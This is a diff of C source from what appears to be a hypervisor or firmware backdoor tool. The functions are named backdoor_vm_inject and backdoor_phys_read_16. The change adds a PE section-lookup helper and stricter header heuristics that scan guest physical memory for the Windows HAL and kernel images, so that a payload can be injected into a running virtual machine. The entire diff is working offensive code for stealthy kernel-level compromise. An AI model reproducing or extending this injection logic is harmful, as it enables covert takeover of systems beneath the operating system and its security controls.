@@ -227,6 +227,27 @@ uint64_t backdoor_find_free_pte(uint64_t pml4_addr, uint64_t ept_addr, uint64_t 
     return 0;
 }
 //--------------------------------------------------------------------------------------
+bool image_has_section(IMAGE_NT_HEADERS *hdr, char *lpszSectionName)
+{
+    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
+        RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
+
+    IMAGE_SECTION_HEADER *sec_curr = sec;
+
+    // look for the image section by name
+    for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
+    {
+        if (!strncmp((char *)&sec->Name, lpszSectionName, strlen(lpszSectionName)))
+        {
+            return true;
+        }
+
+        sec += 1;
+    }
+
+    return false;
+}
+
 int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *payload, int payload_size, bool report_error)
 {
     int ret = -1;
@@ -338,6 +359,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
     uint32_t hal_idata_addr = 0;
     uint32_t hal_idata_size = 0;
 
+    // scan for the beginning of the image
     while (hal_lm_stub - hal_addr_virt < PAGE_SIZE * 0x500)
     {
         m_quiet = true;
@@ -353,6 +375,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
 
         uint16_t signature = 0;
 
+        // read DOS header signature
         if (backdoor_phys_read_16(phys_addr, &signature) != 0)
         {
             goto _end;
@@ -368,30 +391,27 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
             IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
                 RVATOVA(data, ((IMAGE_DOS_HEADER *)data)->e_lfanew); 
 
-            // check for the sane header
+            // heuristics to check for the sane header
             if (hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE &&
-                hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&                 
-                hdr->FileHeader.NumberOfSections > 10)
+                hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&
+                hdr->FileHeader.NumberOfSections > 10 &&
+                hdr->OptionalHeader.MajorImageVersion == 10 && hdr->OptionalHeader.MinorImageVersion == 0 && 
+                hdr->OptionalHeader.MajorSubsystemVersion == 10 && hdr->OptionalHeader.MinorSubsystemVersion == 0 &&
+                hdr->OptionalHeader.MajorOperatingSystemVersion == 10 && hdr->OptionalHeader.MinorOperatingSystemVersion == 0 &&
+                image_has_section(hdr, "PAGEKD") && image_has_section(hdr, "PAGELK"))
             {
                 IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                     RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
 
                 IMAGE_SECTION_HEADER *sec_curr = sec;
 
-                // look for the PAGEVRFY section, HAL doesn't have it
-                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
+                // check for the PAGEVRFY section, HAL doesn't have it
+                if (image_has_section(hdr, "PAGEVRFY"))
                 {
-                    if (!strncmp((char *)&sec_curr->Name, "PAGEVRFY", 8))
-                    {
-                        // HalpLMStub() points to the kernel image!
-                        nt_addr_virt = hal_addr_virt;
-                        goto _nt_found;
-                    }
-
-                    sec_curr += 1;
+                    // HalpLMStub() points to the kernel image!
+                    nt_addr_virt = hal_addr_virt;
+                    goto _nt_found;
                 }
-
-                sec_curr = sec;
 
                 // look for the .idata section
                 for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
@@ -427,7 +447,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
         goto _end;
     }
 
-    printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_addr_virt, hal_addr_phys);        
+    printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_addr_virt, hal_addr_phys);
 
     hal_size = _ALIGN_UP(hal_size, PAGE_SIZE);
 
@@ -488,12 +508,15 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
         goto _end;
     }
 
+    goto _end;
+
 _nt_found:
 
     uint32_t nt_sec_align = 0, ptr = 0;
     uint32_t nt_text_addr = 0, nt_text_size = 0;
     uint32_t nt_edata_addr = 0, nt_edata_size = 0;    
 
+    // scan for the beginning of the image
     while (ptr < PAGE_SIZE * 0x200)
     {
         m_quiet = true;
